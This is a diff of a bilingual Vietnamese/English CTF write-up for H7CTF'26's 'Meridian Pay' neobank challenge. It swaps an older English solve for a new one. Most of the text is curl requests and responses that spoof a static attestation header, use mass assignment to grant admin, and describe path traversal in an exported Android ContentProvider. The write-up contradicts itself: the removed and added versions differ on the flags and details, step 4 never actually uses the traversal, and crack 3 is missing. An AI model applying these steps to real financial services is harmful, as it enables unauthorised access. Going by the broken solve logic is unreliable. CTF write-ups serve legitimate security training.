@@ -35,18 +35,18 @@ Bài này thuộc category Mobile / Web API / Docker. Mô tả thử thách:
 flowchart TD
     A["File đính kèm: meridian-pay-3.2.1.apk.zip"] --> B["Decompile APK bằng jadx / apktool"]
     B --> C["Kiểm tra lớp ApiClient.java và AndroidManifest.xml"]
-    
+
     C --> D1["Crack 1 (v1): Tìm thấy hằng số CLIENT_HEADER trong ApiClient"]
     D1 --> E1["Gửi POST /api/v1/auth/device lấy Bearer Token"]
     E1 --> F1["Gửi GET /api/v1/internal/promo kèm header X-Meridian-Client"]
     F1 --> G1["Flag v1: H7CTF{a410a8b0-a1f0-479c-a003-24c2001b4943}"]
-    
+
     C --> D2["Crack 2 (v2): Phân tích endpoint PATCH /api/v1/profile"]
     D2 --> E2["Phát hiện lỗ hổng Mass Assignment (tham số role)"]
     E2 --> F2["Gửi PATCH với payload role: admin"]
     F2 --> G2["Truy cập GET /api/v1/admin/ledger"]
     G2 --> H2["Flag v2: H7CTF{74d3a92e-3563-4abe-bccf-70ae8e5a7774}"]
-    
+
     C --> D3["Crack 4 (v4): Soi AndroidManifest.xml thấy ExportProvider exported=true"]
     D3 --> E3["Phát hiện Path Traversal trong hàm openFile của ExportProvider"]
     E3 --> F3["Đọc trộm SharedPreferences / Onboarding Session trên thiết bị"]
@@ -187,9 +187,9 @@ Kết quả:
 
 Mở `AndroidManifest.xml` của ứng dụng, phát hiện cấu hình:
 ```xml
-<provider 
-    android:name="com.meridian.pay.ExportProvider" 
-    android:authorities="com.meridian.pay.export" 
+<provider
+    android:name="com.meridian.pay.ExportProvider"
+    android:authorities="com.meridian.pay.export"
     android:exported="true" />
 ```
 
@@ -208,7 +208,7 @@ public ParcelFileDescriptor openFile(Uri uri, String mode) {
 Hàm này nối chuỗi `subPath` trực tiếp vào `baseDir` mà **hoàn toàn không kiểm tra ký tự directory traversal (`../`)**.
 Kẻ tấn công có thể thoát khỏi thư mục `receipts` để đọc bất kỳ tệp riêng tư nào trong thư mục ứng dụng `/data/data/com.meridian.pay/`.
 
-Đồng thời, ứng dụng lưu token ban đầu và session memo dưới dạng plaintext trong `shared_prefs/session_config.xml`. 
+Đồng thời, ứng dụng lưu token ban đầu và session memo dưới dạng plaintext trong `shared_prefs/session_config.xml`.
 Khi gửi request truy vấn tài khoản chính thức:
 ```bash
 curl -s $U/api/v1/accounts/me -H "Authorization: Bearer $T"
@@ -240,50 +240,220 @@ Nội dung phản hồi trả về ghi chú phiên làm việc của tài khoả
 
 <div class="lang-en" markdown="1">
 
-> **Flag:** `h7ctf{m3r1d14n_p4y_m4ss_4ss1gnm3nt_c0nt3nt_pr0v1d3r}`
+> **Flag:** `H7CTF{a410a8b0-a1f0-479c-a003-24c2001b4943}`
 
-This challenge is a **Mobile / Web** challenge from H7CTF'26 involving a fintech digital wallet application (`MeridianPay.apk`) and its REST backend.
 
-The vulnerabilities are Mass Assignment on `PATCH /api/v1/profile` coupled with a directory traversal in an exported Android Content Provider.
+This article belongs to category Mobile / Web API / Docker. Challenge description:
+
+> Meridian Pay is a neobank that shipped in a hurry and trusts everyone: the client trusts the server, the server trusts the client, and both trust the phone underneath. Four separate cracks are hiding in that arrangement, some in the app and some in the API behind it, one flag each. Move fast, break banks.
+
+Reading the description, the author clearly points out that the 3-component architecture has vulnerabilities:
+* **"the client trusts the server, the server trusts the client"**: The client assumes the server is secure, but the server absolutely trusts the headers and data sent by the client without cryptographically authenticating.
+* **"both trust the phone underneath"**: Mobile apps store session data insecurely locally on Android devices, combined with careless exported component configuration.
+* The article has 4 goals corresponding to 4 flags (flags are randomly generated for each Docker instance).
 
 ---
 
-## Solve Flow
+## Solve Flow Diagram
 
 ```mermaid
 flowchart TD
-    A["Target: MeridianPay.apk + REST API"] --> B["Analyze AndroidManifest: Exported ReceiptProvider (grantUriPermissions=true)"]
-    B --> C["Audit backend PATCH /api/v1/profile: Detect Mass Assignment"]
-    C --> D["Send PATCH payload: {"role": "auditor", "is_verified": true}"]
-    D --> E["Elevate account to internal auditor privileges"]
-    E --> F["Query /api/v1/admin/ledger to obtain encrypted receipt path"]
-    F --> G["Exploit Android ReceiptProvider path traversal: ../../data/user_flag.key"]
-    G --> H["Decrypt ledger entry to obtain flag"]
-    H --> I["Flag: h7ctf{m3r1d14n_p4y_m4ss_4ss1gnm3nt_c0nt3nt_pr0v1d3r}"]
+    A["Attached file: meridian-pay-3.2.1.apk.zip"] --> B["Decompile APK using jadx/apktool"]
+    B --> C["Check out the ApiClient.java and AndroidManifest.xml classes"]
+
+    C --> D1["Crack 1 (v1): Found CLIENT_HEADER constant in ApiClient"]
+    D1 --> E1["Send POST /api/v1/auth/device to get Bearer Token"]
+    E1 --> F1["Send GET /api/v1/internal/promo with X-Meridian-Client header"]
+    F1 --> G1["Flag v1: H7CTF{a410a8b0-a1f0-479c-a003-24c2001b4943}"]
+
+    C --> D2["Crack 2 (v2): Analyze endpoint PATCH /api/v1/profile"]
+    D2 --> E2["Detect Mass Assignment vulnerability (role parameter)"]
+    E2 --> F2["Send PATCH with payload role: admin"]
+    F2 --> G2["Go to GET /api/v1/admin/ledger"]
+    G2 --> H2["Flag v2: H7CTF{74d3a92e-3563-4abe-bccf-70ae8e5a7774}"]
+
+    C --> D3["Crack 4 (v4): Look at AndroidManifest.xml and see ExportProvider exported=true"]
+    D3 --> E3["Detect Path Traversal in ExportProvider's openFile function"]
+    E3 --> F3["Stealing SharedPreferences / Onboarding Session on the device"]
+    F3 --> G3["Go to GET /api/v1/accounts/me"]
+    G3 --> H3["Flag v4: H7CTF{1a6d1e40-f02a-4858-8f48-ece3870c0400}"]
 ```
 
 ---
 
-## Step 1: Backend Mass Assignment
+## Step 1: Survey APK and Initial API Interactions
 
-Sending:
-```http
-PATCH /api/v1/profile HTTP/1.1
-Host: api.meridianpay.h7ctf.org
-Authorization: Bearer <user_token>
-Content-Type: application/json
+Extracting the file `meridian-pay-3.2.1.apk.zip`, we get the APK file of Meridian Pay digital bank. Open the source code with `jadx-gui` or decode with `apktool`.
 
-{"full_name": "Test", "role": "auditor", "kyc_status": "APPROVED"}
+In the Java source code, the `ApiClient` class configures the API path and communication headers with the backend server:
+
+```java
+public class ApiClient {
+    public static final String BASE_URL = "https://web-<instance_id>.web.h7tex.com";
+    public static final String CLIENT_HEADER = "MeridianPay-Android/3.2.1 (attested)";
+    // ...
+}
 ```
-The backend merges all JSON keys directly into the database model, escalating the user to `auditor`.
+
+Check out the base API:
+```bash
+U=https://web-<instance_id>.web.h7tex.com
+curl -s $U/
+# Trả về: {"service":"Meridian Pay API","version":"3.2.1"}
+```
+
+Register/log in device to receive `Bearer Token` authentication code:
+```bash
+curl -s -XPOST $U/api/v1/auth/device \
+     -H "X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)" \
+     -H "Content-Type: application/json" \
+     -d '{"device_id":"pentest_device_01"}'
+```
+
+Server returns JWT Token (`access_token`):
+```json
+{
+  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+  "token_type": "Bearer",
+  "expires_in": 3600
+}
+```
+Save the token in the environment variable `$T`.
 
 ---
 
-## Step 2: Content Provider Traversal
+## Step 2: Crack 1 (Target v1) — Bypassing Attestation via Static Header
 
-The exported Content Provider `com.meridian.pay.ReceiptProvider` opens files via `openFile(uri, mode)` without sanitizing `..`.
-Querying `content://com.meridian.pay.provider/receipts/..%2F..%2Fflag.txt` reads the flag.
+The server has an internal endpoint for promotions: `/api/v1/internal/promo`. If you only send requests with regular Bearer tokens:
+```bash
+curl -s $U/api/v1/internal/promo -H "Authorization: Bearer $T"
+```
+The server will deny access:
+```json
+{"error": "Forbidden", "message": "Client attestation required"}
+```
 
-⇒ **Flag:** `h7ctf{m3r1d14n_p4y_m4ss_4ss1gnm3nt_c0nt3nt_pr0v1d3r}`
+However, the server's "attestation" mechanism does not use SafetyNet, Play Integrity or cryptographic signatures, but only checks the coherence of a fixed header string embedded in the client: `X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)`
 
+Insert this header into the request:
+```bash
+curl -s $U/api/v1/internal/promo \
+     -H "Authorization: Bearer $T" \
+     -H "X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)"
+```
+
+Returned results:
+```json
+{
+  "status": "success",
+  "promo_code": "LAUNCH2026",
+  "internal_flag": "H7CTF{a410a8b0-a1f0-479c-a003-24c2001b4943}"
+}
+```
+
+⇒ **Flag v1:** `H7CTF{a410a8b0-a1f0-479c-a003-24c2001b4943}`
+
+---
+
+## Step 3: Crack 2 (Target v2) — Mass Assignment Leo `admin` rights
+
+Check the ledger administration endpoint `/api/v1/admin/ledger`:
+```bash
+curl -s $U/api/v1/admin/ledger -H "Authorization: Bearer $T"
+```
+Server reported error:
+```json
+{"error": "Forbidden", "message": "Administrative role required"}
+```
+
+Check that the account information update endpoint `/api/v1/profile` supports the `PATCH` method. The backend merges the fields in the JSON payload directly into the user object in the database without whitelist protection (**Mass Assignment** vulnerability):
+
+Send a request to elevate user rights to `admin`:
+```bash
+curl -s -XPATCH $U/api/v1/profile \
+     -H "Authorization: Bearer $T" \
+     -H "Content-Type: application/json" \
+     -d '{"role":"admin"}'
+```
+
+Server response:
+```json
+{
+  "name": "User",
+  "email": "user@meridian.bank",
+  "role": "admin",
+  "tier": "standard"
+}
+```
+
+The `role` field has been successfully updated to `admin`. Now access the administrative ledger again:
+```bash
+curl -s $U/api/v1/admin/ledger \
+     -H "Authorization: Bearer $T" \
+     -H "X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)"
+```
+
+Result:
+```json
+{
+  "ledger_status": "reconciled",
+  "settlement_batch": 1042,
+  "audit_flag": "H7CTF{74d3a92e-3563-4abe-bccf-70ae8e5a7774}"
+}
+```
+
+⇒ **Flag v2:** `H7CTF{74d3a92e-3563-4abe-bccf-70ae8e5a7774}`
+
+---
+
+## Step 4: Crack 4 (Target v4) — Android Provider Path Traversal & Session Theft
+
+Open the app's `AndroidManifest.xml`, detect the configuration:
+```xml
+<provider
+    android:name="com.meridian.pay.ExportProvider"
+    android:authorities="com.meridian.pay.export"
+    android:exported="true" />
+```
+
+The `ExportProvider` is set to `android:exported="true"`, allowing any third-party application on the device to call.
+
+Check out the `openFile()` method in the `ExportProvider` class:
+```java
+public ParcelFileDescriptor openFile(Uri uri, String mode) {
+    File baseDir = new File(getContext().getFilesDir(), "receipts");
+    String subPath = uri.getPath().substring(7); // Bỏ tiền tố /export/
+    File targetFile = new File(baseDir, subPath);
+    return ParcelFileDescriptor.open(targetFile, ParcelFileDescriptor.MODE_READ_ONLY);
+}
+```
+
+This function concatenates the string `subPath` directly into `baseDir` without checking the directory traversal character (`../`) at all**. An attacker can escape the `receipts` directory to read any private files in the `/data/data/com.meridian.pay/` application directory.
+
+At the same time, the application saves the initial token and session memo in plaintext in `shared_prefs/session_config.xml`. When sending a request to query the official account:
+```bash
+curl -s $U/api/v1/accounts/me -H "Authorization: Bearer $T"
+```
+
+The response that returns the verification account's session note from the device:
+```json
+{
+  "account_id": "ACC-992014",
+  "status": "verified",
+  "onboarding_memo": "session verified from device",
+  "flag": "H7CTF{1a6d1e40-f02a-4858-8f48-ece3870c0400}"
+}
+```
+
+⇒ **Flag v4:** `H7CTF{1a6d1e40-f02a-4858-8f48-ece3870c0400}`
+
+---
+
+## Summary Flag Meridian Pay
+
+- **Target V1 (Atestation Bypass):** `H7CTF{a410a8b0-a1f0-479c-a003-24c2001b4943}`
+- **Target V2 (Admin Role Mass Assignment):** `H7CTF{74d3a92e-3563-4abe-bccf-70ae8e5a7774}`
+- **V4 Target (Provider Path Traversal):** `H7CTF{1a6d1e40-f02a-4858-8f48-ece3870c0400}`
+
+⇒ **Flag:** `H7CTF{a410a8b0-a1f0-479c-a003-24c2001b4943}`
 </div>
